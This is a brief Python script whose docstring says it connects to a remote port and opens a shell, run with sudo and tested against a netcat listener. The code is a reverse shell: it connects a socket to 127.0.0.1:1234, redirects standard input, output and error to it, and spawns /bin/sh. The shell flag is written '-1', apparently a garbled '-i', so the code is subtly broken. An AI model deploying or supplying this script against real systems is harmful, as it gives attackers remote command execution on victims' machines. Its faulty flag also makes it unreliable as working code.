#!/usr/bin/python3 
"""	
Use this script to try to connect to remote port and execute a bash terminal
change privileges of script:
	chmod +x connect_subproc.py
execute script code: 
	sudo python3 connect_subproc.py

Note:
To test connection try with netcat "nc -l -p 1234"
"""
import socket 
import subprocess
import os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1',1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh", "-1"])